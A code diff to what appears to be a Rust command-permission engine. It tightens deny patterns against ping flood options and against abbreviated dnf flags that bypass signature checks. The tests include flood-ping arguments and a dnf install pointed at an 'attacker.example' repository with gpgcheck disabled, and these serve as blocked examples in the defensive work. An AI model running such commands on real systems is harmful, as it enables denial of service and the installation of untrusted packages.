@@ -46,7 +46,37 @@ fn deny(command: &str, arg_pattern: &str) -> Rule {
 /// ping's only short option using `f` is `--flood`, so there is no
 /// legitimate flag this rejects. The interval alternative is likewise
 /// extended to clustered forms such as `-ci0.01`.
-const PING_ABUSE_FLAGS: &str = r"(?:^|\s)-[A-Za-z]*f|--flood|(?:^|\s)-[A-Za-z]*i\s*0*\.\d";
+///
+/// Four further gaps were closed in the adversarial review pass:
+/// * `-i 0` (a bare integer zero) is accepted by real `ping` and floods
+///   just as effectively as `-i 0.01`, but the old pattern required a
+///   literal decimal point, so it sailed through. The interval alternative
+///   now matches either a fractional value (`0.01`, `.001`) or an
+///   all-zero integer value (`0`, `00`) terminated by whitespace or the
+///   end of the string. It deliberately does *not* match `-i 1` or
+///   `-i 10`, which are ordinary intervals.
+/// * `-A` (adaptive ping) paces packets to the round-trip time, which on a
+///   LAN is flood ping by another name.
+/// * `-l <n>` (preload) blasts `n` packets before waiting for any reply.
+/// * `-s <n>` (packet size) is the oversized-packet DoS vector already
+///   named in the comment in `src/tools/network.rs`, but never actually
+///   added here.
+///
+/// All four use the same `(?:^|\s)-[A-Za-z]*X` token shape as the existing
+/// alternatives, so only an option-looking token starting with `-` at a
+/// token boundary can trip them. A hostname containing the same letter
+/// (`fedoraproject.org`, `my-fileserver.local`) cannot, because its `-` is
+/// never preceded by whitespace or the start of the string. `A`, `l` and
+/// `s` are matched case-sensitively, and no other `ping` option uses those
+/// exact letters in those exact cases, so nothing legitimate is rejected.
+const PING_ABUSE_FLAGS: &str = concat!(
+    r"(?:^|\s)-[A-Za-z]*f",
+    r"|--flood",
+    r"|(?:^|\s)-[A-Za-z]*i\s*(?:0*\.\d|0+(?:\s|$))",
+    r"|(?:^|\s)-[A-Za-z]*A",
+    r"|(?:^|\s)-[A-Za-z]*l",
+    r"|(?:^|\s)-[A-Za-z]*s",
+);
 
 /// systemctl flags that redirect the operation away from the local system.
 /// `--host`/`-H` runs the command against a remote machine over SSH,
@@ -74,7 +104,25 @@ const SYSTEMCTL_HOST_REDIRECT_FLAGS: &str =
 /// `--setopt` can reach either of those (and more) indirectly. The tier's
 /// `^(install|remove|upgrade)` allow pattern matches the leading subcommand
 /// only and says nothing about the flags that follow it.
-const DNF_TRUST_BYPASS_FLAGS: &str = r"nogpgcheck|repofrompath|--setopt";
+///
+/// The patterns match *prefixes*, not the full flag names. dnf's CLI is
+/// argparse-based with `allow_abbrev` left at its default, so any
+/// unambiguous prefix of a long option is accepted: `dnf install
+/// --nogpgchec pkg` disables signature checking exactly as `--nogpgcheck`
+/// does, while containing neither the substring `nogpgcheck` nor anything
+/// the old pattern matched. Each prefix below is the shortest form that is
+/// still unambiguous to dnf itself, so every abbreviation dnf would accept
+/// necessarily contains it:
+/// * `--nog` — the other `--no*` options are `--nobest`, `--nodocs`,
+///   `--noautoremove` and `--noplugins`, so `--nog` already resolves
+///   uniquely to `--nogpgcheck`.
+/// * `--repof` — `--repo` is itself a real option, so the shortest
+///   unambiguous prefix of `--repofrompath` is one character longer.
+/// * `--set` — no other dnf option begins `--set`.
+///
+/// Requiring the leading `--` keeps these short prefixes from matching a
+/// package name that merely happens to contain the same letters.
+const DNF_TRUST_BYPASS_FLAGS: &str = r"--nog|--repof|--set";
 
 /// journalctl subcommands and flags that write to `/var/log/journal`
 /// rather than read from it. `--setup-keys` generates and writes Forward
@@ -246,6 +294,21 @@ mod tests {
             vec!["-i0.01".to_string(), "8.8.8.8".to_string()],
             // Clustered form of the interval flag: `-ci0.01` is `-c -i 0.01`.
             vec!["-ci0.01".to_string(), "8.8.8.8".to_string()],
+            // A bare integer zero interval floods just as effectively as a
+            // fractional one, and the pattern used to require a decimal
+            // point.
+            vec!["-i".to_string(), "0".to_string(), "8.8.8.8".to_string()],
+            vec!["-i0".to_string(), "8.8.8.8".to_string()],
+            vec!["-i".to_string(), "00".to_string(), "8.8.8.8".to_string()],
+            vec!["-i".to_string(), "0".to_string()],
+            // Adaptive ping: paced to the round-trip time, which on a LAN
+            // is flood ping under another name.
+            vec!["-A".to_string(), "8.8.8.8".to_string()],
+            vec!["-cA".to_string(), "4".to_string(), "8.8.8.8".to_string()],
+            // Preload: blasts n packets before waiting for a reply.
+            vec!["-l".to_string(), "1000".to_string(), "8.8.8.8".to_string()],
+            // Oversized packets, the DoS vector named in network.rs.
+            vec!["-s".to_string(), "65000".to_string(), "8.8.8.8".to_string()],
         ] {
             assert!(
                 matches!(engine.evaluate("ping", &denied), Decision::Denied(_)),
@@ -274,6 +337,25 @@ mod tests {
                 "-w".to_string(),
                 "5".to_string(),
                 "my-fileserver.local".to_string(),
+            ],
+            // Ordinary integer intervals must survive the `-i 0` fix: only
+            // an all-zero value is a flood.
+            vec!["-i".to_string(), "1".to_string(), "8.8.8.8".to_string()],
+            vec!["-i".to_string(), "10".to_string(), "8.8.8.8".to_string()],
+            // Uppercase `-S` (sndbuf) is a different option from `-s`, and
+            // the deny alternatives are case-sensitive.
+            vec!["-S".to_string(), "1024".to_string(), "8.8.8.8".to_string()],
+            // A hostname whose embedded hyphen is not at a token boundary
+            // must not trip the new single-letter alternatives.
+            vec![
+                "-c".to_string(),
+                "4".to_string(),
+                "host-alpha.local".to_string(),
+            ],
+            vec![
+                "-c".to_string(),
+                "4".to_string(),
+                "web-server.example".to_string(),
             ],
         ] {
             assert!(
@@ -396,6 +478,56 @@ mod tests {
                 "systemctl {allowed:?} should be allowed under the standard tier"
             );
         }
+    }
+
+    #[test]
+    fn standard_tier_denies_abbreviated_dnf_trust_bypass_flags() {
+        // dnf's argparse-based CLI accepts any unambiguous prefix of a long
+        // option, so `--nogpgchec` disables signature checking exactly as
+        // `--nogpgcheck` does. The deny pattern matches the shortest
+        // unambiguous prefix so every accepted abbreviation contains it.
+        let engine = PolicyEngine::new(rules_for_tier(&TierName::Standard));
+        for denied in [
+            vec![
+                "install".to_string(),
+                "--nogpgchec".to_string(),
+                "pkg".to_string(),
+            ],
+            vec![
+                "install".to_string(),
+                "--nog".to_string(),
+                "pkg".to_string(),
+            ],
+            vec![
+                "install".to_string(),
+                "--repof=evil,http://attacker.example/repo".to_string(),
+                "pkg".to_string(),
+            ],
+            vec![
+                "install".to_string(),
+                "--setop=gpgcheck=0".to_string(),
+                "pkg".to_string(),
+            ],
+        ] {
+            assert!(
+                matches!(engine.evaluate("dnf", &denied), Decision::Denied(_)),
+                "dnf {denied:?} should be denied under the standard tier"
+            );
+        }
+
+        // A package name that merely contains the same letters is not a
+        // flag, and the required `--` prefix keeps it allowed.
+        assert!(matches!(
+            engine.evaluate("dnf", &["install".into(), "-y".into(), "nogpgd".into()]),
+            Decision::Allowed
+        ));
+        assert!(matches!(
+            engine.evaluate(
+                "dnf",
+                &["install".into(), "--repo".into(), "updates".into()]
+            ),
+            Decision::Allowed
+        ));
     }
 
     #[test]
